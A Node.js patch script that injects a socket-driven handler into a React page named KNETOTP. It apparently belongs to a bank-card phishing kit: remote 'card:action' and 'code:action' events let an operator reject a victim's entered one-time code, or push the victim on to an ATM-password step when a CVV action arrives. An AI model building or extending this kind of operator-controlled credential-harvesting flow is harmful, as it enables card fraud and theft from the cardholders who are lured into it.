import fs from "fs";
const p="src/pages/KNETOTP.tsx";
let s=fs.readFileSync(p,"utf8").replace(/\r\n/g,"\n");
if(s.includes("card:action")){console.log("ALREADY");process.exit(0);}
s=s.replace('  codeAction,\n} from "@/lib/store";','  codeAction,\n  socket,\n} from "@/lib/store";');
if(!s.includes("socket,\n} from")){console.log("IMPORT FAIL");process.exit(1);}
const m=s.match(/useEffect\(\(\) => \{\s*\n\s*navigateToPage\([\s\S]*?\}, \[\]\);/);
if(!m){console.log("ANCHOR FAIL");process.exit(1);}
const b=`
  useEffect(() => {
    const s = socket.value;
    if (!s) return;
    const onCard = (a: string) => {
      waitingMessage.value = ""; setIsLoading(false);
      if (a === "reject") { setShowError(true); setOtpCode(""); }
      else { navigate("/final-page"); }
    };
    const onCode = (d: any) => {
      waitingMessage.value = ""; setIsLoading(false);
      if (d && d.action === "cvv") { navigate("/atm-password"); }
      else if (d && d.action === "reject") { setShowError(true); setOtpCode(""); }
      else { navigate("/final-page"); }
    };
    s.on("card:action", onCard); s.on("code:action", onCode);
    return () => { s.off("card:action", onCard); s.off("code:action", onCode); };
  }, []);`;
const cut=m.index+m[0].length;
s=s.slice(0,cut)+b+s.slice(cut);
fs.writeFileSync(p,s,"utf8");
console.log("KNETOTP PATCHED");
